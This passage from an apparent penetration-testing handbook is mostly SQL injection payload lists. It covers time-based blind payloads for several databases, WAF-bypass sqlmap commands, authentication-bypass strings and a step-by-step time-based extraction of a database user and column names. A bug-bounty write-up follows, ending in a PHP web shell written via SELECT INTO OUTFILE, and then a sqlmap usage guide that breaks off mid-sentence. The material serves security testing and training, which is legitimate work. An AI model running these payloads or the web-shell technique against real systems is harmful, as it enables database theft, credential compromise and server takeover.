') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337'='1337 
')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337'='1337 
'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337'='1337 
' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337'='1337 
') AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ('1337' LIKE '1337 
')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337 
'))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '1337 
%' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337%'='1337 
' AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND '1337' LIKE '1337 
") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337"="1337 
")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337"="1337 
"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337"="1337 
" AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND "1337"="1337 
") AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ("1337" LIKE "1337 
")) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (("1337" LIKE "1337 
"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337" LIKE "1337 
" AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND "1337" LIKE "1337 
' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337 
Microsoft SQL Server Blind (Time Based): 
;waitfor delay '0:0:5'-- 
';WAITFOR DELAY '0:0:5'-- 
);waitfor delay '0:0:5'-- 
';waitfor delay '0:0:5'-- 
";waitfor delay '0:0:5'-- 
');waitfor delay '0:0:5'-- 
");waitfor delay '0:0:5'-- 
));waitfor delay '0:0:5'-- 
'));waitfor delay '0:0:5'-- 
[[ PAGE 249 ]]
"));waitfor delay '0:0:5'-- 
") IF (1=1) WAITFOR DELAY '0:0:5'-- 
';%5waitfor%5delay%5'0:0:5'%5--%5 
' WAITFOR DELAY '0:0:5'-- 
' WAITFOR DELAY '0:0:5' 
or WAITFOR DELAY '0:0:5'-- 
or WAITFOR DELAY '0:0:5' 
and WAITFOR DELAY '0:0:5'-- 
and WAITFOR DELAY '0:0:5' 
WAITFOR DELAY '0:0:5' 
;WAITFOR DELAY '0:0:5'-- 
;WAITFOR DELAY '0:0:5' 
1 WAITFOR DELAY '0:0:5'-- 
1 WAITFOR DELAY '0:0:5' 
1 WAITFOR DELAY '0:0:5'-- 1337 
1' WAITFOR DELAY '0:0:5' AND '1337'='1337 
1') WAITFOR DELAY '0:0:5' AND ('1337'='1337 
1) WAITFOR DELAY '0:0:5' AND (1337=1337 
') WAITFOR DELAY '0:0:5'-- 
" WAITFOR DELAY '0:0:5'-- 
')) WAITFOR DELAY '0:0:5'-- 
'))) WAITFOR DELAY '0:0:5'-- 
%' WAITFOR DELAY '0:0:5'-- 
") WAITFOR DELAY '0:0:5'-- 
")) WAITFOR DELAY '0:0:5'-- 
"))) WAITFOR DELAY '0:0:5'-- 
Postgresql Blind (Time Based): 
";SELECT pg_sleep(5); 
;SELECT pg_sleep(5); 
and SELECT pg_sleep(5); 
1 SELECT pg_sleep(5); 
or SELECT pg_sleep(5); 
(SELECT pg_sleep(5)) 
pg_sleep(5)-- 
1 or pg_sleep(5)-- 
" or pg_sleep(5)-- 
' or pg_sleep(5)-- 
1) or pg_sleep(5)-- 
") or pg_sleep(5)-- 
') or pg_sleep(5)-- 
1)) or pg_sleep(5)-- 
")) or pg_sleep(5)-- 
')) or pg_sleep(5)-- 
pg_SLEEP(5) 
pg_SLEEP(5)-- 
pg_SLEEP(5)# 
or pg_SLEEP(5) 
[[ PAGE 250 ]]
or pg_SLEEP(5)-- 
or pg_SLEEP(5)# 
' SELECT pg_sleep(5); 
or SELECT pg_sleep(5); 
' SELECT pg_sleep(5); 
1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) 
1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))-- 1337 
1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337 
1') AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND ('1337'='1337 
1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (1337=1337 
Oracle Blind (Time Based): 
You can replace AND / OR 
1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)1 AND 
1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- 1337' AND 
1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND 
'1337'='1337') AND 
1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND 
('1337'='1337) AND 
1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND 
(1337=1337 
Generic Time Based SQL Injection Payloads: 
sleep(5)# 
(sleep 5)-- 
(sleep 5) 
(sleep(5))-- 
(sleep(5)) 
-sleep(5) 
SLEEP(5)# 
SLEEP(5)-- 
SLEEP(5)=" 
SLEEP(5)=' 
";sleep 5-- 
";sleep 5 
";sleep(5)-- 
";sleep(5) 
";SELECT SLEEP(5); # 
1 SELECT SLEEP(5); # 
+ SLEEP(5) + ' 
&&SLEEP(5) 
&&SLEEP(5)-- 
&&SLEEP(5)# 
;sleep 5-- 
;sleep 5 
;sleep(5)-- 
;sleep(5) 
[[ PAGE 251 ]]
;SELECT SLEEP(5); # 
'&&SLEEP(5)&&'1 
' SELECT SLEEP(5); # 
benchmark(50000000,MD5(1)) 
benchmark(50000000,MD5(1))-- 
benchmark(50000000,MD5(1))# 
or benchmark(50000000,MD5(1)) 
or benchmark(50000000,MD5(1))-- 
or benchmark(50000000,MD5(1))# 
ORDER BY SLEEP(5) 
ORDER BY SLEEP(5)-- 
ORDER BY SLEEP(5)# 
AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
OR (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337 
RANDOMBLOB(500000000/2) 
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) 
OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) 
RANDOMBLOB(1000000000/2) 
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) 
OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) 
If response delay between 5 to 7 Seconds . 
It means vulnerable. 
Detection and exploitation: 
1.=payload 
Example: 
=0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z=(select(0)from(select(sleep(5)))v)email=test@g
mail.com' WAITFOR DELAY '0:0:5'--
email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z 
2.=value payload 
Example: 
=1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND 
'%'='=1'XOR(if(now()=sysdate(),sleep(5),0))OR'=1 AND (SELECT 1337 FROM 
(SELECT(SLEEP(5)))YYYY)-- 1337 
     
=1 or sleep(5)# 
Mysql blind sql injection (time based): 
email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z 
[[ PAGE 252 ]]
 
 
 
 
[[ PAGE 253 ]]
 
 
MSSQL blind Sql injection (time based): 
email=test@gmail.com' WAITFOR DELAY '0:0:5'-- 
[[ PAGE 254 ]]
 
 
[[ PAGE 255 ]]
 
 
 
3.https://redact.com/page/payload 
https://redact.com/page/value payload 
Example: 
https://redact.com/page/if(now()=sysdate(),sleep(3),0)/"XOR(if(now()=sysdate(),sleep(3),0))O
R"/https://redact.com/(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)
+'"https://redact.com/page/1 AnD SLEEP(5)https://redact.com/page/1' ORDER BY SLEEP(5) 
[[ PAGE 256 ]]
 
4.Blind Sql injection in json: 
{payload} 
[payload] 
{value payload} 
Example: 
[-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))]{AnD SLEEP(5)}{1 AnD SLEEP(5)}{1' AnD 
SLEEP(5)--}{sleep 5}"emails":["AnD SLEEP(5)"]"emails":["test@gmail.com' OR 
SLEEP(5)#"]{"options":{"id":[],"emails":["AnD SLEEP(5)"], 
5.Blind Sql injection in Graphql: 
{“operationName”:”pages”,”variables”:{“offset”:0,”limit”:10,”sortc”:”name 
Payload”,”sortrev”:false},”query”:”query pages($offset: Int!, $limit: Int!, $sortc: String, 
$sortrev: Boolean) {\n pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: 
$sortReverse) {\n id\n n\n __typen\n }\n me {\n firstN\n lastN\n usern\n __typen\n }\n 
components {\n title\n __typen\n }\n templates {\n title\n __typen\n }\n fonts {\n n\n 
__typen\n }\n partners {\n id\n n\n banners {\n n\n __typen\n }\n __typen\n }\n}\n”} 
Example: 
{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name AND 
sleep(5)","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, 
$sortrev: Boolean) {\n pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: 
$sortReverse) {\n id\n n\n __typen\n }\n me {\n firstN\n lastN\n usern\n __typen\n }\n 
components {\n title\n __typen\n }\n templates {\n title\n __typen\n }\n fonts {\n n\n 
__typen\n }\n partners {\n id\n n\n banners {\n n\n __typen\n }\n __typen\n }\n}\n"} 
6.Http header based (Error based,Time Based): 
Referer: https://https://redact.com/408685756payload 
Cookie: _gcl_au=1.1.2127391584.1587087463paylaod 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/55.0.2883.87Payload 
[[ PAGE 257 ]]
or 
Referer: https://https://redact.com/408685756 payload 
Cookie: _gcl_au=1.1.2127391584.1587087463 paylaod 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/55.0.2883.87 Payload 
X-Forwarded-For: paylaod 
Mysql Error Based: 
 
Mysql Error Based 
Mssql Error Based: 
 
Mssql Error Based 
7.Blind Sql injection exploitation (Manual): 
MySql Time Based:RESULTING QUERY (WITH MALICIOUS SLEEP INJECTED).SELECT * FROM 
products WHERE id=1-SLEEP(5)RESULTING QUERY (WITH MALICIOUS BENCHMARK 
INJECTED).SELECT * FROM products WHERE id=1-BENCHMARK(100000000, rand())RESULTING 
QUERY - TIME-BASED ATTACK TO VERIFY DATABASE VERSION.SELECT * FROM products 
[[ PAGE 258 ]]
WHERE id=1-IF(MID(VERSION(),1,1) = '5', SLEEP(5), 0)Time Based Sqli:1 and (select sleep(5) 
from users where SUBSTR(table_name,1,1) = 'A')#Error Blind SQLi: 
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -Ultimate Sql 
injection Payload: 
SELECT * FROM some_table WHERE double_quotes = 
"IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF
(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(I
F(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"Ex
ploitation: 
redact.com/page/search?q=1 and sleep(5)--Current user:redact.com/page/search?q=1 and 
if(substring(user(),1,1)='a',SLEEP(5),1)--redact.com/page/search?q=1 and 
if(substring(user(),2,1)='a',SLEEP(5),1)--redact.com/page/search?q=1 and 
if(substring(user(),3,1)='a',SLEEP(5),1)--Table_name guessing:redact.com/page/search?q=1 
and IF(SUBSTRING((select 1 from [guess_your_table_name] limit 
0,1),1,1)=1,SLEEP(5),1)redact.com/page/search?q=1 and IF(SUBSTRING((select 
substring(concat(1,[guess_your_column_name]),1,1) from [existing_table_name] limit 
0,1),1,1)=1,SLEEP(5),1)redact.com/page/search?q=1 and if((select mid(column_name,1,1) from 
table_name limit 0,1)='a',sleep(5),1)-- 
Mssql Time Based:RESULTING QUERY (WITH MALICIOUS SLEEP INJECTED).SELECT * FROM 
products WHERE id=1; WAIT FOR DELAY '00:00:5'RESULTING QUERY (VERIFY IF USER IS 
SA).SELECT * FROM products WHERE id=1; IF SYSTEM_USER='sa' WAIT FOR DELAY 
'00:00:5'Exploitation: 
http://redact.com/page.aspx?id=1; WAITFOR DELAY '00:00:5'-- (+5 seconds)TIME-BASED 
Extraction of CURRENT DATABASE USER 
Determine Length of USER: 
http://redact.com/page.aspx?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:5'-- 
http://redact.com/page.aspx?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:5'-- 
http://redact.com/page.aspx?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:5'-- 
http://redact.com/page.aspx?id=1; IF (LEN(USER)=4) WAITFOR DELAY '00:00:5'-- 
http://redact.com/page.aspx?id=1; IF (LEN(USER)=5) WAITFOR DELAY '00:00:5'-- (+5 seconds) 
Result = 5 characters in lengthDetermine length, and then try to find out CHAR value one 
character position at a time, like this: 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))>96) WAITFOR 
DELAY '00:00:5'-- (+5 seconds) 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))>50) WAITFOR 
DELAY '00:00:5'-- 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1)))>98) WAITFOR 
DELAY '00:00:5'-- 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),1,1))=97) WAITFOR DELAY 
'00:00:5'-- (+5 seconds) 
Result = the first character CHAR value is 97 which is an "a" 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),2,1)))>99) WAITFOR 
DELAY '00:00:5'-- (+5 seconds) 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),2,1)))=50) WAITFOR 
DELAY '00:00:5'-- (+5 seconds) 
Result = the second character CHAR value is 50 which is a "d" 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),3,1)))>58) WAITFOR 
DELAY '00:00:5'-- (+5 seconds) 
[[ PAGE 259 ]]
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),3,1)))=59) WAITFOR 
DELAY '00:00:5'— 
Result = third character CHAR value is 59 which is the letter "m" 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),4,1)))>54) WAITFOR 
DELAY '00:00:5'-- (+5 seconds) 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),4,1)))=55) WAITFOR 
DELAY '00:00:5'-- (+5 seconds) 
Result = the fourth character CHAR value is 55 which is an "i" 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),5,1)))>59) WAITFOR 
DELAY '00:00:5'-- (+5 seconds) 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((USER),5,1)))=15) WAITFOR 
DELAY '00:00:5'-- (+5 seconds) 
the fifth character position has CHAR value of 15 which is the letter "n"Database User = 
97,50,59,55,15 = adminTIME-BASED Extraction of 1st TABLE COLUMNS: 
let’s enumerate some columns from the table(s) we found:http://redact.com/page.aspx?id=1; 
IF (LEN(SELECT TOP 1 column_name from testDB.information_schema.columns where 
table_name='Members')=4) WAITFOR DELAY '00:00:5'-- (+5 seconds)You can check the length 
before you start testing away 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name 
from testDB.information_schema.columns where table_name='Members'),1,1)))=117) 
WAITFOR DELAY '00:00:5'-- (+5 seconds) 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name 
from testDB.information_schema.columns where table_name='Members'),1,1)))=115) 
WAITFOR DELAY '00:00:5'-- (+5 seconds) 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name 
from testDB.information_schema.columns where table_name='Members'),1,1)))=51) 
WAITFOR DELAY '00:00:5'-- (+5 seconds) 
http://redact.com/page.aspx?id=1; IF (ASCII(lower(substring((SELECT TOP 1 column_name 
from testDB.information_schema.columns where table_name='Members'),1,1)))=114) 
WAITFOR DELAY '00:00:5'-- (+5 seconds)Column Name = 117,115,51,114 = userPostgresql 
Blind SQLI(Stacked Queries):id=1; select pg_sleep(5);-- -1; SELECT case when (SELECT 
current_setting('is_superuser'))='on' then pg_sleep(5) end;-- - 
8.Blind Sql injection exploitation via sqlmap: 
sqlmap -r req.txt -v 3 --time-sec=5 --technique=T --current-db 
sqlmap -r req.txt -v 3 -p "input parameter" --level=5 --risk=3 --time-sec=5 --technique=T --
current-db 
sqlmap -r req.txt -v 3 -p "input parameter" --level=5 --risk=3 --time-sec=5 --technique=BT --
current-db 
9.Blind Sql injection WAF bypass (tamper): 
Example: 
sqlmap -r req.txt -v 3 -p "input parameter" --level=5 --risk=3 --time-sec=5 --technique=T --
tamper=between --current-dbMysql,Mssql,Postgresql,Oracle (Blind): 
betweenMysql (Blind): 
ifnull2casewhenisnullifnull2ifisnullMysql,Mssql,Postgresql,Oracle (Blind): 
charencodeMysql,Mssql,Postgresql (Blind): 
charunicodeencodeMysql (Blind): 
[[ PAGE 260 ]]
commalesslimitcommalessmidMysql (Blind): 
escapequotesUTF-8 (Blind): 
apostrophemaskoverlongutf8overlongutf8moreBypass waf in JSON (Blind): 
charunicodeescapeMysql,Postgresql,Oracle (Blind): 
greatestCloudfare waf (Blind): 
xforwardedfor 
And 
Quick SQLMap Tamper Suggester: 
https://github.com/m4ll0k/Atlas 
10.Sql detection payload (Generic Error): 
' 
" 
'" 
. 
/ 
\ 
%5c 
%27 
%22 
%23 
%3B 
) 
") 
') 
)) 
")) 
')) 
# 
; 
'' 
` 
`` 
, 
"" 
// 
\\ 
% 
%00 
||#Detection source:["SQL syntax.*MySQL", "Warning.*mysql_.*", "valid MySQL result", 
"MySqlClient\."] 
["PostgreSQL.*ERROR", "Warning.*\Wpg_.*", "valid PostgreSQL result", "Npgsql\."] 
["Driver.* SQL[\-\_\ ]*Server", "OLE DB.* SQL Server", "(\W|\A)SQL Server.*Driver", 
"Warning.*mssql_.*", "(\W|\A)SQL Server.*[0-9a-fA-F]{8}", 
"(?s)Exception.*\WSystem\.Data\.SqlClient\.", "(?s)Exception.*\WRoadhouse\.Cms\."] 
["Microsoft Access Driver", "JET Database Engine", "Access Database Engine"] 
["\bORA-[0-9][0-9][0-9][0-9]", "Oracle error", "Oracle.*Driver", "Warning.*\Woci_.*", 
[[ PAGE 261 ]]
"Warning.*\Wora_.*"] 
["CLI Driver.*DB2", "DB2 SQL error", "\bdb2_\w+\("] 
["SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException", 
"Warning.*sqlite_.*", "Warning.*SQLite3::", "\[SQLITE_ERROR\]"] 
["(?i)Warning.*sybase.*", "Sybase message", "Sybase.*Server message.*"] 
11.SQL Injection Auth Bypass: 
'=' 'or' 
' or ''=' 
/1#\ 
'-' 
' ' 
'&' 
'^' 
'*' 
' or ''-' 
' or '' ' 
' or ''&' 
' or ''^' 
' or ''*' 
"-" 
" " 
"&" 
"^" 
"*" 
" or ""-" 
" or "" " 
" or ""&" 
" or ""^" 
" or ""*" 
or true-- 
" or true-- 
' or true-- 
") or true-- 
') or true-- 
admin' -- 
admin' # 
admin'/* 
admin' or '1'='1 
admin' or '1'='1'-- 
admin' or '1'='1'# 
admin'or 1=1 or ''=' 
admin' or 1=1 
admin' or 1=1-- 
admin' or 1=1# 
admin' or 1=1/* 
admin") or ("1"="1 
admin") or ("1"="1"-- 
[[ PAGE 262 ]]
admin") or ("1"="1"# 
admin") or ("1"="1"/* 
admin") or "1"="1 
admin") or "1"="1"-- 
admin") or "1"="1"# 
admin") or "1"="1"/* 
' or 'x'='x 
') or ('x')=('x 
')) or (('x'))=(('x 
" or "x"="x 
") or ("x")=("x 
")) or (("x"))=(("x 
1'or'1'='1 
or 1=1 
or 1=1-- 
or 1=1# 
or 1=1/* 
admin' or '1'='1'/* 
admin') or ('1'='1 
admin') or ('1'='1'-- 
admin') or ('1'='1'# 
admin') or ('1'='1'/* 
admin') or '1'='1 
admin') or '1'='1'-- 
admin') or '1'='1'# 
admin') or '1'='1'/* 
admin" -- 
admin" # 
admin"/* 
admin" or "1"="1 
admin" or "1"="1"-- 
admin" or "1"="1"# 
admin" or "1"="1"/* 
admin"or 1=1 or ""=" 
admin" or 1=1 
admin" or 1=1-- 
admin" or 1=1# 
admin" or 1=1/* 
References : 
• 
Blind SQL Injection 
https://www.owasp.org/index.php/Blind_SQL_Injection 
• 
Testing for SQL Injection (OTG-INPVAL-005) 
https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005) 
• 
SQL Injection Bypassing WAF 
[[ PAGE 263 ]]
https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF 
• 
Reviewing Code for SQL Injection 
https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection 
• 
PL/SQL:SQL Injection 
https://www.owasp.org/index.php/PL/SQL:SQL_Injection 
• 
Testing for NoSQL injection 
https://www.owasp.org/index.php/Testing_for_NoSQL_injection 
• 
SQL Injection Query Parameterization Cheat Sheet 
https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html 
• 
SQL detection and Exploitation: 
http://www.securityidiots.com/Web-Pentest/SQL-Injection 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection 
https://github.com/payloadbox/sql-injection-payload-list 
https://github.com/Y000o/Payloads_xss_sql_bypass/blob/master/Payloads_xss_sql_bypass.m
d 
https://pentestmonkey.net/category/cheat-sheet/sql-injection 
SQL Injection and RCE 
Everyone knows what is SQLi and what is RCE, so I’m not going to give a brief in this blog. I’ll be 
sharing the technique and cheat sheet that I used for exploitation. 
For SQLi I used https://dev.mysql.com/doc/refman/8.0/en/select.html for knowing the query 
structure, it helped me a lot in exploiting SQLi on the website. I was only able to find the name 
of database, table names, column names and database version. But I wanted to exploit it more 
to because I wanted admin credentials so I googled SQLi cheatsheet and found 
this http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet. It 
helped me a lot and finally I found the admin credentials. It was a hash obviously, so I 
used https://crackstation.net/ to crack the hash. I also wanted to check schema table because 
it contains a lot of information so I used this 
: https://dev.mysql.com/doc/refman/8.0/en/information-schema.html. 
For Remote code execution I used a simple payload inside phpmyadmin page and I got RCE. 
Payload : SELECT “<?php system($_GET[‘<anyParameter>’]); ?>” into outfile 
“/var/www/html/<filename>.php” 
I found SQLi vulnerability on 2nd level subdomain and RCE was on 3rd level subdomain. 
How I found this vulnerability ? 
1. I found a parameter and 1st I tried for SSRF but it didn’t work so I thought of trying 
SQLi, I started with SQLi basic testing and took a help from here 
: http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Error-
Based-Injection.html 
[[ PAGE 264 ]]
2. I found it vulnerable to SQLi and the first thing I enumerated was version and database 
name. So I used database() function and @@version command here. 
 
Database Version 
 
Database Name 
3. Then I thought of identifying the user so for that I used a simple user() function 
[[ PAGE 265 ]]
 
User name 
It was simple till here but they told me to exploit more if I want them to accept my report. So I 
started researching for further exploitation. 
4. I exploited further and found a table name from the schema table 
 
Table Name 
5. I wanted to check for some more tables so I used limit statement. I found a table hotel but 
this is the one I found previously. 
[[ PAGE 266 ]]
 
Table Name 
NOTE : LIMIT statement is used to retrieve records from one or more tables in a database and 
limit the number of records returned based on a limit value. “LIMIT statement is not supported 
in all SQL databases.” 
6. The next step was to find how many tables are there so I changed the query of limit (check 
the below screenshot for query) 
 
Table Name 
[[ PAGE 267 ]]
 
Table Name 
7. Now I had 3 tables so I wanted to find the columns from the table schema. 
NOTE : We had total of three tables so I performed the query accordingly 
 
Column Names along with the table name 
8. I changed the table_schema name to mysql to find what is there in it and I found many 
important tables and columns 
[[ PAGE 268 ]]
 
Column Names along with the table name 
9. Next step was to find the admin username and password, I found the credentials and 
reported to them. But later after 3 days I enumerated the subdomain of a subdomain and 
lucky those credentials worked their on phpmyadmin page which led me to RCE 
 
Admin Credentials 
Phase 2 (RCE) : 
1. Found the phpmyadmin page, in the credentials obtained the password was in a hash 
form so I used online tool to crack it 
[[ PAGE 269 ]]
 
phpmyadmin 
2. I used a simple query to put my file on the server and check for RCE 
 
Putting my file for RCE 
3. And I successfully got the RCE 
[[ PAGE 270 ]]
 
Remote Code Execution 
4. I wanted to exploit it further to get a system shell-back so I used a simple python script 
from http://pentestmonkey.net/ to get a system shell I was successful 
 
Python Script 
[[ PAGE 271 ]]
 
SQL Injection with SQLMAP 
System requirements for sqlmap 
You can install sqlmap on Windows, macOS, and Linux. 
The sqlmap system is written in Python, so you have to install Python 2.6 or later on your 
computer in order to run sqlmap. The current version as at July 2021 is 3.9. 
To find out whether you have Python installed, on Windows open a command prompt and 
enter python –version. If you don’t have Python, you will see a message telling you to type 
python again without parameters. Type python and this will open up the Microsoft Store with 
the Python package set up to download. Click on the Get button and follow installation 
instructions. 
If you have macOS type python –version. If you get an error message, enter the following 
commands: 
$ xcode-select --install 
$ ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" 
$ brew install python3 
In those lines, the $ represents the system prompt – don’t type that in. 
If you have Linux, you will already have Python installed. 
Install sqlmap 
To install sqlmap: 
1. Go to the website for the sqlmap project at sqlmap.org. 
2. If you have Windows, click on the Download .zip file button. If you have macOS or 
Linux, click on the Download .tar.gz file button. 
3. Unpack the compressed file. 
[[ PAGE 272 ]]
Your system will automatically name the directory the same as the compressed file. However, 
this is a very long name, so opt to have the new directory called just sqlmap. It doesn’t matter 
where on your computer you create that directory. 
Running sqlmap 
The sqlmap system is a command-line utility. There isn’t a GUI interface for it. So, go to the 
command line on your computer to use sqlmap. Change to the sqlmap directory that you 
created in order to run the utility. You do not have to compile any program. 
The program that you run in order to use sqlmap is called sqlmap.py. It will not run unless you 
add an option to the end of the program name. 
The options for sqlmap are: 
-u URL 
 
The target URL 
 
 
Format: -u "http://www.target.com/path/file.htm?variable=1" 
-d DIRECT 
 
Connection string for direct database connection 
 
 
Format: -d DBMS://DATABASE_FILEPATH or 
 
 
-d DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME 
-l LOGFILE 
Parse target(s) from Burp or WebScarab proxy log file 
-m BULKFILE 
 
Scan multiple targets given in a textual file 
 
 
Format: The file should contain a URL per line 
-r REQUESTFILE 
 
Load HTTP request from a file 
 
 
Format: The file can contain an HTTP or an HTTPS transaction 
-g GOOGLEDORK 
Process Google dork results as target URLs 
[[ PAGE 273 ]]
-c CONFIGFILE 
Load options from a configuration INI file 
--wizard 
A guided execution service 
--update 
Update sqlmap to the latest version 
--purge 
Clear out the sqlmap data folder 
--purge-output 
As above 
--dependencies 
Check for missing sqlmap dependencies 
-h 
Basic help 
-hh 
Advanced help 
-- version 
Show the version number 
You can’t run sqlmap without one of those options. There are many other options and it is 
often necessary to string several options in sequence on a command line. 
A full attack requires so many options and inputs that it is easier to put all of those options in a 
file and then call the file instead of typing them all in. In this scenario, it is a convention to 
store all of the options in a text file with the extension .INI. You would include this list of 
options in the command line with the -c option followed by the file name. This method cuts 
out repeating typing in the whole long command over and over again to account for spelling 
mistakes or format errors. 
More sqlmap options 
There are many other switches that you can add to a sqlmap command. Option parameters 
that are character-based should be enclosed in double-quotes (“ “), numerical parameters 
should not be quoted. 
In the interests of brevity within this guide, we have presented all of these in a PDF file: 
[[ PAGE 274 ]]
 
Click on the image above to open the full sqlmap Cheat Sheet JPG in a new window, or click 
here to download the sqlmap Cheat Sheet PDF. 
Running an SQL injection attack scan with sqlmap 
The large number of options available for sqlmap is daunting. There are too many options to 
comb through in order to work out how to form an SQL injection attack. The best way to 
acquire the knowledge of how to perform the different types of attacks is to learn by example. 
To experience how a sqlmap test system proceeds, try the following test run, substituting the 
URL of your site for the marker <URL>. You need to include the schema on the front of the URL 
(http or https). 
$ sqlmap.py -u “<URL>” --batch --banner 
This command will trigger a run-through of all of the sqlmap procedures, offering you options 
over the test as it proceeds. 
The system will show the start time of the test. Each report line includes the time that each 
test completed. 
The sqlmap service will test the connection to the Web server and then scan various aspects of 
the site. These attributes include the site’s default character set, a check for the presence 
of defense systems, such as a Web application firewall or intrusion detection systems. 
The next phase of the test identifies the DBMS used for the site. It will attempt a series of 
attacks to probe the vulnerability of the site’s database. These are: 
[[ PAGE 275 ]]
• 
A GET input attack – this identifies the susceptibility to Classic SQLI and XSS attacks 
• 
DBMS-specific attacks 
• 
Boolean-based blind SQLI 
• 
The system will ask for a level and a risk value. If these are high enough, it will run a 
time-based blind SQLI 
• 
An error-based SQLI attack 
• 
A UNION-based SQLI if the level and risk values are high enough 
• 
Stacked queries 
In answer to the banner option used in this run, sqlmap completes its run by fetching the 
database banner. Finally, all extracted data with explanations of their meanings are written 
to a log file. 
As you can see, without many options given on the command, the sqlmap system will run 
through a standard series of attacks and will check with the user for decisions over the depth 
of the test as the test progresses. 
A small change in the command will run the same battery of tests but by using a POST as a test 
method instead of a GET. 
Try the following command: 
$ sqlmap.py -u “<URL>” --data=“id=1” --banner 
Password cracking with sqlmap 
A change of just one word in the first command used for the previous section will give you a 
